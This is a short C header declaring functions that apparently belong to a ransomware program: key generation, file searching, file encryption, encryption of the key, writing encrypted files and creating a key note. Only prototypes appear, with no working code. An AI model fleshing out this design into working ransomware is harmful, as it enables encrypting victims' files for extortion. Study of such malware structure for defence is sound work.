#include "ran_common.h"

void gen_key(unsigned char* key_out, int key_len);

void key_print(unsigned char* key, int size);

void file_search(char filenames[][MAX_PATH], int* filecount);

int get_file_size(const char filenames[][MAX_PATH], int filenumber);

void file_enc(const char* filename, int number, unsigned char* key, unsigned char* iv);

int get_enc_size(const char* filename, int number);

void r_enc(unsigned char* key, unsigned char* key_out);

void make_encfile(const char* filename, int number, unsigned char* key1, unsigned char* key2, unsigned char* iv, int filesize, int enc_filesize);

void make_key_note(unsigned char* key, unsigned char* iv);